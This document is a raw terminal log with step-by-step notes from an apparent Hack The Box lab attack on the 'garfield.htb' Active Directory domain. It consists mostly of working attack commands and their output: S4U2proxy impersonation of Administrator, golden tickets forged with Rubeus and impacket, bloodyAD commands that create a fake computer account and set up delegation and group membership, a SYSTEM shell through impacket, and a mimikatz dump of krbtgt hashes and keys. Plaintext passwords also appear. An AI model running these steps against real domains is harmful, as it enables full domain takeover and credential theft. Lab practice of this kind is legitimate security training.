      D6ADAgEBoQgwBhsEejBuJA==

[*] Impersonating user 'Administrator' to target SPN 'cifs/rodc01.garfield.htb'
[*] Using domain controller: RODC01.garfield.htb (fe80::7a33:8251:f697:4c2d%5)
[*] Building S4U2proxy request for service: 'cifs/rodc01.garfield.htb'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/rodc01.garfield.htb':
      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
      b2RjMDEuZ2FyZmllbGQuaHRi
[+] Ticket successfully imported!
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe golden /rc4:6d0850da20ee4a11b06bfd7a31cdcf11 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /user:Administrator /krbtgt:krbtgt_8245 /outfile:rodc.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 6D0850DA20EE4A11B06BFD7A31CDCF11
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 6D0850DA20EE4A11B06BFD7A31CDCF11
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 11:38:10 AM
[*] StartTime      : 4/6/2026 11:38:10 AM
[*] EndTime        : 4/6/2026 9:38:10 PM
[*] RenewTill      : 4/13/2026 11:38:10 AM

[*] base64(ticket.kirbi):

      doIFMzCCBS+gAwIBBaEDAgEWooIEMDCCBCxhggQoMIIEJKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4ID6DCCA+SgAwIBF6EDAgEDooID1gSCA9LBqpfS
      SlGJ6j+qZsbnkH6CAT3vTeBi+KBeWff28MUHUCu7M6grMVuQnj+zZFgIn6nF1mPbH4L5cXYjkokCvX07
      oxhpqU9xuuN/e/8Ax8jUKmR7c8r1mXgB0uCfeS2okC4wufTUmD9E9/aHya8VmU0+lCdOZ/ezIDnTM9Wu
      ncedqi5TGVLPo0b226BcHNEsQPd6PTmMSjoeOrXjjz+mdcGGt1q8Kdyip2/aldli3gAljzq0yr4IgI6P
      GH3+MNgbvsNuxXHM9Xgwx4fzs18UMXuNc7aUuWR/TB7q596nDujEtPfxPWYdDPCGw/G3hmseohdGDdIL
      9M7MezioEeighXk0V/k+RLfrpeU2zWKq0vihIvIBk2w0ynQQnnLlF5fSMdLu3mI1GRfp1CtMYTROJDgD
      FGv33FqLH0S4R6D0F/dbTbXkuMDHP1YaElt0NcRzY4MwAAwNrfXmQMVTg/pf7+2WJCJllLvZlGD/MM7Y
      bjk5qwc/n1DWQRE2f/ZO3KQxIUIOQzlxfvB4RLvH3+cxUw0N7u9S4nZQe4repFypMszZd22paI9Y3VJe
      FvmfquqMKfAcCUr3+5obzA5/MBK7BZTIhtELyE9EcdVDL79VZ8mqubSk/1MKYN1UnBaOLFqUNYET7aoA
      ruxdKmwPBnGMwCPUVFtI4JBY6IbP/EGYi5nnko98rfncV2jpV90ibemoyOvzl31YjvMAKqnwpee/rofJ
      bHKwikz/XI6TT9ufa9cg9ygKGJl1lrsqv43uHTsVmuLKTlpLcn4EuipP23ILTbSiploaAzZIrndS6Mzz
      ELqXwH+XYt7aj2axI5Imdebz8HVkYPhBHW+kGEN9dskKU/u1lodXB6RY2twNDB99/wCu961Ozv6R9q9Y
      kjG+okkU1syvEJy1mLRzfGPlyT7IdPzr9VXr2Y217FcWv6uXnLhrSjnhKvnWR9qV5f6CzLzBaXscHGby
      VCDG6Bj0pfvvaWGiiheenGpaU6FpgjwtohOeZWSXcns5qinTVzlv3AKZmz8jmUgySYvr6efV4GzM4M9T
      DxVmkGuAq/vNpXTo0IvtVG2ptpIbIiklTJfyyiLqkbPEBbaHMzbly3C+d8vpIGg5ZjxgWtYfC8rn+tmn
      x3Ek6eNg82C/S+bx1hsyadsx3xpjzz5oH3G7PD98wsE9+1310DjeMZR4vGKTOGbcxqIQbA5Gnw0hiEYa
      QPLDUmZOoS0RMAsl8Ew6/ikDvZSrKDS2jdAdtleFamDr31m2QDzT+up+K6AKOFC41uoXbWZFr7dxWsXf
      6H97lxm0Uk8SZIuYTVqjge4wgeugAwIBAKKB4wSB4H2B3TCB2qCB1zCB1DCB0aAbMBmgAwIBF6ESBBCR
      VH4xcgIBBka/CC+WJZffoQ4bDEdBUkZJRUxELkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAEDgAACkERgPMjAyNjA0MDYxODM4MTBapREYDzIwMjYwNDA2MTgzODEwWqYRGA8yMDI2MDQwNzA0
      MzgxMFqnERgPMjAyNjA0MTMxODM4MTBaqA4bDEdBUkZJRUxELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRn
      dBsMZ2FyZmllbGQuaHRi


[*] Ticket written to rodc_2026_04_06_18_38_10_Administrator_to_krbtgt@GARFIELD.HTB.kirbi


*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Import-Module ActiveDirectory
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-ADUser -Identity krbtgt_8245 -Properties msDS-KeyVersionNumber | Select-Object Name, msDS-KeyVersionNumber

Name        msDS-KeyVersionNumber
----        ---------------------
krbtgt_8245                     3


*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe hash /password:GoldenTicketKey2026!@# /user:krbtgt_8245 /domain:garfield.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : GoldenTicketKey2026!@#
[*] Input username             : krbtgt_8245
[*] Input domain               : garfield.htb
[*] Salt                       : GARFIELD.HTBkrbtgt_8245
[*]       rc4_hmac             : 6D0850DA20EE4A11B06BFD7A31CDCF11
[*]       aes128_cts_hmac_sha1 : 8ABCD92E7931DCA5E7B8CB0FE74A7E7A
[*]       aes256_cts_hmac_sha1 : A9235DBD4DAA4E2D9F20ABBA0666332D893FB0E26BCEB4B8EF9A48822AB8CB35
[*]       des_cbc_md5          : 2034CDB0F4C17668

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 


*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe golden /aes256:A9235DBD4DAA4E2D9F20ABBA0666332D893FB0E26BCEB4B8EF9A48822AB8CB35 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /user:Administrator /krbtgt:krbtgt_8245 /kvno:3

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : A9235DBD4DAA4E2D9F20ABBA0666332D893FB0E26BCEB4B8EF9A48822AB8CB35
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : A9235DBD4DAA4E2D9F20ABBA0666332D893FB0E26BCEB4B8EF9A48822AB8CB35
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 11:47:10 AM
[*] StartTime      : 4/6/2026 11:47:10 AM
[*] EndTime        : 4/6/2026 9:47:10 PM
[*] RenewTill      : 4/13/2026 11:47:10 AM

[*] base64(ticket.kirbi):

      doIFRzCCBUOgAwIBBaEDAgEWooIENDCCBDBhggQsMIIEKKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4ID7DCCA+igAwIBEqEDAgEDooID2gSCA9bfv+4q
      VKrwjFxZlsFf1WOwSwSfx6Mrekr1moSH5v2TrCTJfjnB6u/1F0JnO5LN1wu1DANIAPuYR7By3fENhhYz
      2PETWXnz2LZandffBZJSEmvxyZlxrGRm8w+YxyB4nwQ508HOJ7XyoNZEYiVfdn8uvRV+CbXtLZP4/SeM
      yo1yn5yiSW1uRFfU/6FZ2N17Z3MpIRHx+5gWU1Wl9iKpF/xbVZadU7s/OOKUYWXtpBdXgqqbH11S5zRY
      V7mXcWqiy9JqvT6xYCPn9yudP18Ynx8BK0B4MfLH7XWXNtMlsyR0MB5Aselo2ZAJGeGxWZbE639qBX2R
      cOtL6khVYCX/60Xk2aFL2cwKSp06vKkRGfpiPjTnQef2xPGXjOvJ584X7OZDnhk4NVQUT6tM1q+h8FZH
      8W9D2AAfu1Xkrjwp8UAeGLmcSLZJwtLBYaza1ZmsjuU84HtLNaOT83UWfPLCx3Zl1MH1Ip1ZxyLsYqJI
      nTdypwDE8CaT4j5GIX4zSsbeu2M+kFeQPkpTZlCrlmEEX7ysdhBmspa3G6TFbLnC2C73zD+2gu5JJNgG
      xk8NHBfui9mwQsehXiOu5XuWQkmtCxPgmgesCcunUw4qCkJby+4pecw/9vYNy0prLmI5pJ0Dz9zWyzUl
      w/s52QpH1AoMFoUO9VdWkZQGaxRkHaEcPDq4P7fYv2h7xbkMVbpmdWrLz1lcfEOtcJMVxlTOLJ7EZLFp
      dKCIPS4jPtmT+V1txAko6fmn/z+XFX2s7t3+knwx8JBUgzMoKeEiN/lkFKPihlW7f+vJIyrmAbceNjnA
      p3H0HCa3r4nxsEvzS23vPf3cvjAisTb7hJ/9p+1z8e+GW4xBcHtqCMX5G+Tp32dxDbo+IS2cE4AeYCwa
      TYF8734JVpT8vyAfu1UIGYvYL4Uqun4ouOJ6HnONcf5yA5fJNHNj2EKKgVTeTtDKPHzKgi/oNzXXOLfF
      1jOL7ZFhOg/jPkgeykSf0kvNJEKAHVSpu8Lce3vnfSlSU7TnqkWhD14pEHKfsGOMJiSjd+pLABdNyqxm
      cnC6QFGmb8aJckrAVO80VLA5dx+exJC+RAQT6lyUa4eATGOdi40Yx068ulJjQBf3mQcn1k5VIVWS26UB
      9LNTAc3sSzRvZL0UC7ykgLHcTLCruYJHFp4/x5tJZ9e7to+Xgwx/h9q9oChoZtmod0/HcE5x23m9406Z
      kk9yk+eTUTj6ZPI/ylQMwBKurjw+XjWLS1K7sb2AjRcmwh39knEZMJPiUCFCcY4j91CMRVr5GfkwWNun
      hwKXatoGSYQdHRZR+8yD94sZo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKh
      IgQg6+Jzg77nM/H/tjvDuRLIPi3JDV7ibp+yPnFRd3YOQ6ihDhsMR0FSRklFTEQuSFRCohowGKADAgEB
      oREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDQwNjE4NDcxMFqlERgPMjAyNjA0MDYx
      ODQ3MTBaphEYDzIwMjYwNDA3MDQ0NzEwWqcRGA8yMDI2MDQxMzE4NDcxMFqoDhsMR0FSRklFTEQuSFRC
      qSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> klist

Current LogonId is 0:0x29c766

Cached Tickets: (1)

#0>     Client: Administrator @ GARFIELD.HTB
        Server: cifs/rodc01.garfield.htb @ GARFIELD.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/6/2026 11:30:30 (local)
        End Time:   4/6/2026 21:30:30 (local)
        Renew Time: 4/13/2026 11:30:30 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> klist purge

Current LogonId is 0:0x29c766
        Deleting all tickets:
        Ticket(s) purged!




*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe golden /aes256:A9235DBD4DAA4E2D9F20ABBA0666332D893FB0E26BCEB4B8EF9A48822AB8CB35 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /user:Administrator /krbtgt:krbtgt_8245 /kvno:3 /outfile:rodc_aes.kirbi                                    
                                                                                                                                                                                                                                                                                                                            
   ______        _                                                                                                                                                                                                                                                                                                          
  (_____ \      | |                                                                                                                                                                                                                                                                                                         
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                                                                                                     
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : A9235DBD4DAA4E2D9F20ABBA0666332D893FB0E26BCEB4B8EF9A48822AB8CB35
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : A9235DBD4DAA4E2D9F20ABBA0666332D893FB0E26BCEB4B8EF9A48822AB8CB35
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 11:57:42 AM
[*] StartTime      : 4/6/2026 11:57:42 AM
[*] EndTime        : 4/6/2026 9:57:42 PM
[*] RenewTill      : 4/13/2026 11:57:42 AM

[*] base64(ticket.kirbi):

      doIFRzCCBUOgAwIBBaEDAgEWooIENDCCBDBhggQsMIIEKKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4ID7DCCA+igAwIBEqEDAgEDooID2gSCA9YKvCB4
      6N2F09h/H1Sfde4ZkIeso5jogN3BXGVUvLpIrPvlY8nqHdo98HkHNx5xhGYAXb63IfRLL//x0odOiXM0
      Ji24fdiZI2/rs/7HEuMMvKG7dt/Z8HtmGEkrvtfq4Z7sM9n5URURVyNsm7T99nkL1u1LRb0fDsGwkubw
      kUM/UWPvPJv9wGSLwHHdVHeKYB3qLhBVMC7wqnovgw9K4uNDz6t5ko1h8pf8kgvauikXfazOdVXPtVxy
      Rd5ZiU3FOA+1wUeJkx1svXFru3GF9nXJ3gEV3FeMj8oLTZkCeIgM3WIrfisIvbCvWTw8NlWzM2X1kfY1
      u5eyODktkTktIqrmGqVFbE5FHrhy4RjaPwf3b+p7X24qdlHXRJSmkQyzKkNd61G+L/XhU9PNBBCDYwA4
      LOPVB5m/dJ9rnxpuL3P+POWjYD3y9WUcSr6/t0qXiiYuRfHASvLu5l5kB3P0y5rQmGQPz/4YWFmRQZvl
      z1HLRshH5ayIaFnf2P1+CdHsJCi2Bs3xUf/IggAw6g2oVG5LltRY0ZuJQIJzw7vD9trXw8YwJ5uHwhqY
      ClPoH7yrChaNAo1Jc7yD4wmvLPXrbZbTCqFBJKcVcA4z9QRViBUEw6nj5AZdDDM0gWRRM4+wSMzmM0HM
      9ISvC26ZMl9YjapKjEUFNmSlhJYpF/rENEmA1hdFho1fyC0xpji56lgZuTh0yEyRuMIGY37e5UAF0RRQ
      GDnHnUsTJSBTj7f+kZttZuGJfNbmL/10+nqbBPYgGZegSi2v7iXwK+Z24LsoMScsaHI8mbk9P0VJiISE
      irr6JAmCWnu4JsdCvueLMkUAD2GsXg3bIV3Px3NjVIvLRC0UaL6Cw9GRoWAgWHDjrStz0Lhzw7jW6uMR
      LVDBWbddjSYJ7XQqxm8Os1lDkDrCHz85UuCo4vPYvZ75rVs3v6gzQMh1UOok9DTmlqdKWD9jK4lm5nLA
      4epROhVwjydcMAwK36c4exOoO/uVTUOv8zY4yDIv9kAVJ++kdivhST23h3uz5VJWTIjMOp+YD9M3KqgW
      siTzz8T9jWi/kO4clxwfv+1L2RV8PCGC4vhuJJ6yqJMuC8iKZ4V5t5PXrUFzDWalvytzjIPEBXnxp5q6
      G4tpdi1N+koHpGTr+Y4aKjoChQn7ezM0BMdDEHdpxEVFGrUFk0zxKRa6EvTgmAaSVI8nd+GS7gX+urO3
      E/BUVxV2baSSSnL1IzGY6N1wK1ITfJ33fZKRMq4e/0FtMtuf7DLHNi4L+eX4gqsdgTWC/hL6d73oBX+E
      LvS6CMs6/pIuZfKOn5VG3+q4o4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKh
      IgQgH5GwnHP3Kz//0v7Ja5sitQZBBf6+6+4KkB/lyiro8/ahDhsMR0FSRklFTEQuSFRCohowGKADAgEB
      oREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDQwNjE4NTc0MlqlERgPMjAyNjA0MDYx
      ODU3NDJaphEYDzIwMjYwNDA3MDQ1NzQyWqcRGA8yMDI2MDQxMzE4NTc0MlqoDhsMR0FSRklFTEQuSFRC
      qSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


[*] Ticket written to rodc_aes_2026_04_06_18_57_42_Administrator_to_krbtgt@GARFIELD.HTB.kirbi





*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 

                                                                                                                                                                                                                                                      
  ┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ echo -n 'GoldenTicketKey2026!@#' | iconv -t utf16le | openssl dgst -md4
MD4(stdin)= 6d0850da20ee4a11b06bfd7a31cdcf11

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ impacket-ticketer -nthash 6d0850da20ee4a11b06bfd7a31cdcf11 -domain-sid S-1-5-21-2502726253-3859040611-225969357 -domain garfield.htb Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for garfield.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ export KRB5CCNAME=Administrator.ccache


did it 

Step 1: Create the Fake Computer Account
Run this first to inject z0n$ back into the Domain with the password we need for the ticket later:

Bash
bloodyAD -d garfield.htb -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#' --host 10.129.139.64 add computer 'z0n$' -p 'FakePassword123!'
Step 2: RBCD & Group Setup
Now that z0n$ exists again, run these two commands to configure the delegation and your RODC Admin rights:

Bash
bloodyAD -d garfield.htb -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#' --host 10.129.139.64 add rbcd 'RODC01$' 'z0n$'

bloodyAD -d garfield.htb -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#' --host 10.129.139.64 add groupMember 'RODC Administrators' 'l.wilson_adm'
Step 3: Mint the Ticket
Clean the cache and forge the CIFS ticket using the newly created z0n$ account:

Bash
unset KRB5CCNAME
rm *.ccache

impacket-getST -spn cifs/rodc01.garfield.htb -impersonate Administrator 'garfield.htb/z0n$:FakePassword123!' -dc-ip 10.129.139.64

export KRB5CCNAME=Administrator@cifs_rodc01.garfield.htb@GARFIELD.HTB.ccache
Step 4: System Shell on the RODC
Use that ticket to drop cleanly into your SYSTEM shell:

Bash
impacket-smbexec Administrator@rodc01.garfield.htb -k -no-pass
Step 5: Dump the True Key






┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]                                                                                                                                                                                                                                              
└─$ impacket-wmiexec -k -no-pass garfield.htb/Administrator@rodc01.garfield.htb                                                                                                                                                                                                          
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                         
[*] SMBv3.0 dialect used                                                                                                                                                                                                                                                                 
[!] Launching semi-interactive shell - Careful what you execute                                                                                                                                                                                                                          
[!] Press help for extra shell commands                                                                                                                                                                                                                                                  
C:\>lput /usr/share/windows-resources/mimikatz/x64/mimikatz.exe                                                                                                                                                                                                                          
[*] Uploading mimikatz.exe to C:\mimikatz.exe                                                                                                                                                                                                                                            
C:\>mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" exit                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                         
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                                                                                                                                                                                                                             
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                                                                                                                                                              
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                                                                                                                 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                                                                                                                                                                                  
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                                                                                                                                                                
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                         
mimikatz(commandline) # privilege::debug                                                                                                                                                                                                                                                 
Privilege '20' OK                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                         
mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245                                                                                                                                                                                                                           
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                         
RID  : 00000643 (1603)                                                                                                                                                                                                                                                                   
User : krbtgt_8245                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                         
 * Primary                                                                                                                                                                                                                                                                               
    NTLM : 445aa4221e751da37a10241d962780e2                                                                                                                                                                                                                                              
    LM   :                                                                                                                                                                                                                                                                               
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

 * WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b

mimikatz(commandline) # exit
Bye!

